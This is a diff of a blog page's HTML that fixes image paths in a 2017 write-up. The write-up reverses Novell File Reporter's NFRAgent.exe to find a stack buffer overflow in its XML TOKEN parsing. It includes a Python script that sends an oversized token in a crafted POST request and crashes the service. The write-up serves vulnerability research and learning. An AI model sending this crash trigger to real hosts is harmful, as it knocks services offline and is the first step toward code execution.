@@ -12,23 +12,23 @@
 <meta property="og:url" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/index.html">
 <meta property="og:site_name" content="Charles Muiruri">
 <meta property="og:description" content="Sometime back while looking for challanges to do , I came a cross an article that said how big security companies give guys challanges to test their skills. As a result, I tried to find if I can find">
-<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/main.png">
-<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/strings.png">
-<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/token_string.png">
-<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/main_1.png">
-<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/setup_sr.png">
-<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/connection_request.png">
-<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/handle_FSFUI_request.png">
-<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/validate_request_type.png">
-<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/token.png">
-<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/buffer.png">
-<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/buffer_1.png">
-<meta property="og:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/crash.png">
-<meta property="og:updated_time" content="2017-12-05T13:32:07.000Z">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/main.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/strings.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/token_string.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/main_1.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/setup_sr.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/connection_request.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/handle_FSFUI_request.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/validate_request_type.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/token.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/buffer.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/buffer_1.png">
+<meta property="og:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/crash.png">
+<meta property="og:updated_time" content="2017-12-05T13:40:56.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="The Vupen Entry Test (Part 1)">
 <meta name="twitter:description" content="Sometime back while looking for challanges to do , I came a cross an article that said how big security companies give guys challanges to test their skills. As a result, I tried to find if I can find">
-<meta name="twitter:image" content="http://icrackthecode.github.io/2017/12/04/The-Vupen-Entry-Test-Part-1/main.png">
+<meta name="twitter:image" content="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/main.png">
   
     <link rel="alternate" href="/atom.xml" title="Charles Muiruri" type="application/atom+xml">
   
@@ -137,29 +137,29 @@ ga('send', 'pageview');
 <h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><p>Well the first thing I did was look for the software of interest i.e the Novell File Reporter software, refered to as NFR as from now.<br>Well this was easily available from their site. So I grabbed the relevant version ie 1.0.1.</p>
 <p>In this case I didn’t to do any diffs so I opted to take the long way and reverse from scratch.<br>Next step is to install the Novell File Reporter software so as to get the executables,  in this case, NFRAgent.exe.</p>
 <p>Given that I have some information of the type of bug I am after, I dint have to do alot of reconnaissance so I just loaded the executable to IDA (I simply call this BAE).</p>
-<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/main.png" alt="main"></p>
+<p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/main.png" alt="main"></p>
 <p>Looking at the main function reversing this seems like a walk in the park ,since there IDA imports windows signatures making it easy for use (Also having reversed a couple of firmware this was fairly easy). Now the next step is finding a good attack surtface that meets our requirements. In this case, the bug is specifically a stack buffer overflow hence a good target would be some sort of input that overflows a buffer in the stack. </p>
 <p>The first step is to go through the string just to get a feel of what kind of strings are available. In this case, I am focusing more on strings that might print out or log user input.<br>to narrow down my search I am looking for any string that uses string formating. Well one might ask why strings ? Its simple if its a string I have control of it plus we have the word  <strong> <em> stack buffer</em> </strong> and from the aforementioned I am looking for anything that might allow me to overflow a  buffer on the stack. </p>
-<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/strings.png" alt="Strings"></p>
+<p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/strings.png" alt="Strings"></p>
 <p>Looking  through the string we find  a string that looks interesting .</p>
-<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/token_string.png" alt="Token String"></p>
+<p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/token_string.png" alt="Token String"></p>
 <p>The above string seems to take a token and use it or print it .Well at this point its not clear how the string is use but surely looks intersting. To have a deeper understanding it would be wise at this point to figure out how a token is created.</p>
 <h3 id="Understanding-NFRAgent-exe"><a href="#Understanding-NFRAgent-exe" class="headerlink" title="Understanding NFRAgent.exe"></a>Understanding NFRAgent.exe</h3><p>Looking the main funtion the program begins by creating a new operator if creation was succesful it passes the a value to a functiion which I have named setup_sr_engine.</p>
-<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/main_1.png" alt="main"></p>
+<p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/main_1.png" alt="main"></p>
 <p>Looking carefully, at setup_sr_engine we can see that it sets a new ServerNetworkInterface whose 6th argument is a  pointer to a function which we have named connection request.</p>
-<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/setup_sr.png" alt="Ssetup_sr_engine"></p>
+<p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/setup_sr.png" alt="Ssetup_sr_engine"></p>
 <p>Now let  dive deeper into connection_request</p>
-<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/connection_request.png" alt="Connection request"></p>
+<p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/connection_request.png" alt="Connection request"></p>
 <p>Looking at the above it is evident that this functions identifies the connection requestion based on a key provided as part of the connection request eg FSFUI. In this case we will focus on handle_FSFUI_request .</p>
 <p>This function handles a FSFUI request  which later tries to validate the specific request type</p>
-<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/handle_FSFUI_request.png" alt="handle_FSFUI_request"></p>
-<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/validate_request_type.png" alt="validate_request_type"></p>
+<p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/handle_FSFUI_request.png" alt="handle_FSFUI_request"></p>
+<p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/validate_request_type.png" alt="validate_request_type"></p>
 <p>Nice 😀 now we can see the call to parse_token (which we have named so after reversing) and it takes the value of the node <strong> <em> TOKEN </em> </strong>.</p>
-<h3 id="Understanding-token-parsing"><a href="#Understanding-token-parsing" class="headerlink" title="Understanding token parsing"></a>Understanding token parsing</h3><p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/token.png" alt="Token"></p>
+<h3 id="Understanding-token-parsing"><a href="#Understanding-token-parsing" class="headerlink" title="Understanding token parsing"></a>Understanding token parsing</h3><p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/token.png" alt="Token"></p>
 <p>A closer look at token operations</p>
-<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/buffer.png" alt="token operation"></p>
+<p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/buffer.png" alt="token operation"></p>
 <p><strong> strcpy(_token_dest, _token); </strong><br>At this point we see that there is no check for _token so the  current goal is to find the size of the buffer (_token_dest)  as it makes a good candidate for a stack buffer overflow.</p>
-<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/buffer_1.png" alt="Token data"></p>
+<p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/buffer_1.png" alt="Token data"></p>
 <p>Looking carefully at <strong> char *token_data; // [esp+4h] [ebp-98h]</strong> its evident that the size of buffer is 98h which translates <strong>char token_data[150]</strong>;</p>
 <p>looking carefully at<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">token_len = 2 * xercesc_2_7::XMLString::stringLen(token) + 2;</div><div class="line">_token = (char *)malloc(token_len)</div></pre></td></tr></table></figure></p>
 <p>we can see size of _token is calculated by getting the length of the string passed in <strong>Token</strong> then plus 2 which  means to overflow the buffer we need  to have <strong>lenghtof(token_data)&lt; lengthof(token_passed)</strong> which translates to </p>
@@ -173,13 +173,13 @@ ga('send', 'pageview');
 <p>In this case,  the request of interest in this case would all the key that we called along the request .<br>As a result the request will look like this<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ROOT&gt;&lt;NAME&gt;FSFUI&lt;/NAME&gt;&lt;UICMD&gt;130&lt;/UICMD&gt;&lt;TOKEN&gt;OUR TOKEN VALUE&lt;/TOKEN&gt;&lt;![CDATA[]]&gt;&lt;/ROOT</div></pre></td></tr></table></figure></p>
 <p>Given that its an xml request we will send in that form </p>
 <h4 id="The-trigger-code"><a href="#The-trigger-code" class="headerlink" title="The trigger code"></a>The trigger code</h4> <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line">import httplib, md5, sys,struct</div><div class="line"></div><div class="line">def message_MD5(arg):</div><div class="line">    v = <span class="string">"SRS"</span> + arg + <span class="string">"SERVER"</span></div><div class="line">    m = md5.new(v)</div><div class="line">    <span class="built_in">return</span> m.hexdigest()</div><div class="line"></div><div class="line">try:</div><div class="line">	conn = httplib.HTTPConnection(<span class="string">"192.168.0.12:80"</span>)</div><div class="line">	headers = &#123;<span class="string">"Content-type"</span>: <span class="string">"text/xml"</span>&#125;</div><div class="line"></div><div class="line">	</div><div class="line"></div><div class="line">	junk = <span class="string">'A'</span> * 100</div><div class="line"></div><div class="line"></div><div class="line">	body = <span class="string">"&lt;ROOT&gt;&lt;NAME&gt;FSFUI&lt;/NAME&gt;&lt;UICMD&gt;130&lt;/UICMD&gt;&lt;TOKEN&gt;"</span>+junk+<span class="string">"&lt;/TOKEN&gt;&lt;![CDATA[]]&gt;&lt;/ROOT&gt;"</span></div><div class="line"></div><div class="line">	body =  message_MD5(body).upper() + body</div><div class="line">	conn.request(<span class="string">"POST"</span>, <span class="string">"/"</span>,body, headers)</div><div class="line">	response = conn.getresponse()</div><div class="line">	<span class="built_in">print</span>(<span class="string">"[+] Connected successfuly"</span>)</div><div class="line">	<span class="built_in">print</span> response.status, response.reason</div><div class="line"> </div><div class="line">except Exception as e:</div><div class="line">	<span class="built_in">print</span>(<span class="string">"[-] Connection failed with error %s"</span>,e)</div><div class="line">finally:</div><div class="line">	conn.close()</div></pre></td></tr></table></figure>
-<p><img src="/2017/12/04/The-Vupen-Entry-Test-Part-1/crash.png" alt="Crash"></p>
+<p><img src="/2017/12/05/The-Vupen-Entry-Test-Part-1/crash.png" alt="Crash"></p>
 <h4 id="WOOOOT-🎉🎉🎉🎉-We-a-crash-occurs-We-have-succesfully-triggered-the-bug-🤓-😎-💪"><a href="#WOOOOT-🎉🎉🎉🎉-We-a-crash-occurs-We-have-succesfully-triggered-the-bug-🤓-😎-💪" class="headerlink" title="WOOOOT !!! 🎉🎉🎉🎉  We a crash occurs .   We have succesfully triggered the bug 🤓 😎 💪 ."></a>WOOOOT !!! 🎉🎉🎉🎉  We a crash occurs .   We have succesfully triggered the bug 🤓 😎 💪 .</h4><p>Part 2 will cover DEP bypass, SEH bypass and controlling the EIP stay tunned 😀 .</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/" data-id="cjato8vmf0002q02yluhaieo5" class="article-share-link">Share</a>
+      <a data-url="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/" data-id="cjatoan9g0002qx2yxhkla6ak" class="article-share-link">Share</a>
       
         <a href="http://icrackthecode.github.io/2017/12/05/The-Vupen-Entry-Test-Part-1/#disqus_thread" class="article-comment-link">Comments</a>
       
